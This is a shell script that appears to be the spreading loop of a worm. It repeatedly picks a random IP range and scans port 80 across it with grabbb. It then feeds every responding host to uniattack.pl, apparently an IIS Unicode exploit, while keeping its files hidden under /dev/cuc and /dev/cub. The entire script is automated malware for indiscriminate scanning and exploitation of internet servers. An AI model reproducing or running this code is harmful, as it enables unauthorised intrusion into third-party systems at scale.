#!/bin/sh
while true 
do
i=`/usr/local/bin/perl /dev/cuc/ranip.pl`
j=0
while [ $j -lt 256 ];do
/dev/cuc/grabbb -t 3 -a $i.$j.1 -b $i.$j.50 80 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.51 -b $i.$j.100 80 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.101 -b $i.$j.150 80 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.151 -b $i.$j.200 80 >> /dev/cub/$i.txt
/dev/cuc/grabbb -t 3 -a $i.$j.201 -b $i.$j.254 80 >> /dev/cub/$i.txt
j=`/bin/echo "$j+1"|/bin/bc`
done
iplist=`/bin/awk -F: '{print $1}' /dev/cub/$i.txt`
for ip in $iplist;do
/usr/local/bin/perl /dev/cuc/uniattack.pl $ip:80 >> /dev/cub/result.txt
done
rm -f /dev/cub/$i.txt
done